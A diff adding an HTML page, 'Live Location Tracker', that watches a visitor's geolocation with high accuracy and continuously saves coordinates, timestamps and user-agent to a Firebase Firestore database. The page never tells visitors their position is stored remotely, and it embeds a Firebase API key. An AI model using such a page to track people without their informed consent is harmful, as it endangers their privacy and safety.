@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Live Location Tracker</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+  
+  <!-- Firebase SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
+
+  <!-- Leaflet JS -->
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+
+  <style>
+    #map {
+      height: 100vh;
+      width: 100%;
+    }
+  </style>
+</head>
+<body>
+  <h2 style="text-align:center;">Loading Map... Please allow location access</h2>
+  <div id="map"></div>
+
+  <script>
+    // Step 1: Add your Firebase config here
+    const firebaseConfig = {
+      apiKey: "AIzaSyBgggkEx-r8KkhV4gZcrsajUmGNjPXJ0J8",
+      authDomain: "testrun-3eafe.firebaseapp.com",
+      projectId: "testrun-3eafe",
+      storageBucket: "testrun-3eafe.appspot.com",
+      messagingSenderId: "430388922062",
+      appId: "1:430388922062:web:61cf20124c1e6661617c1f"
+    };
+
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    // Device Info
+    const deviceInfo = navigator.userAgent;
+
+    // Unique session ID
+    const sessionId = "user_" + Math.random().toString(36).substring(2);
+
+    // Initialize map
+    const map = L.map("map").setView([0, 0], 15);
+    L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
+      attribution: "Map data © OpenStreetMap contributors"
+    }).addTo(map);
+
+    const marker = L.marker([0, 0]).addTo(map);
+
+    // Track location
+    if ("geolocation" in navigator) {
+      navigator.geolocation.watchPosition(
+        async (position) => {
+          const lat = position.coords.latitude;
+          const lng = position.coords.longitude;
+          const timestamp = new Date().toISOString();
+
+          // Update marker
+          marker.setLatLng([lat, lng]);
+          map.setView([lat, lng]);
+
+          // Save to Firestore
+          await db.collection("locations").doc(sessionId).set({
+            lat,
+            lng,
+            timestamp,
+            device: deviceInfo
+          });
+        },
+        (error) => {
+          alert("Location access denied or error: " + error.message);
+        },
+        {
+          enableHighAccuracy: true,
+          maximumAge: 1000
+        }
+      );
+    } else {
+      alert("Geolocation is not supported by this browser.");
+    }
+  </script>
+</body>
+</html>
